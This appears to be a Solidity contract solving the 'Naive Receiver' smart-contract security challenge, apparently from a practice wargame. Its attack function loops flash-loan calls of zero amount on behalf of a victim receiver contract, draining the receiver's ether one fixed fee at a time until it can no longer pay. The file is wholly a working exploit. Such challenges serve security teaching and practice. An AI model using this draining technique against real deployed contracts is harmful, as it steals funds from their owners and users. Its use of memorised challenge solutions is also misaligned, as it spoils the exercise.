// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "./INaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
   address public pool;

    constructor(address pool_){
        pool = pool_;
    }
    
    function attack(
        address naiveReceiver
    ) external{
        // each time pull FIX_FEE amount from the receiver contract to pool contract
        while(naiveReceiver.balance >= INaiveReceiverLenderPool(pool).fixedFee()){
            INaiveReceiverLenderPool(pool).flashLoan(naiveReceiver, 0);
        }
    }
}